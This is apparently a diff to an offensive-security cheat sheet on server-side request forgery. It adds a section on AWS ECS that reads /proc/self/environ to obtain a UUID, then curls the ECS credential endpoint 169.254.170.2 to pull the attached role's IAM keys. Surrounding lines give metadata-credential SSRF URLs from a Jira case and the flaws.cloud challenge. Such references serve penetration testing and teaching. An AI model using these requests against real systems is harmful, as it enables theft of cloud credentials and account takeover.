@@ -31,6 +31,7 @@
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
+  * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
   * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
   * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
   * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
@@ -421,6 +422,15 @@ E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugi
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
 
+### SSRF URL for AWS ECS
+
+If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.
+
+```powershell
+curl http://169.254.170.2/v2/credentials/<UUID>
+```
+
+This way you'll extract IAM keys of the attached role
 
 ### SSRF URL for AWS Elastic Beanstalk
 
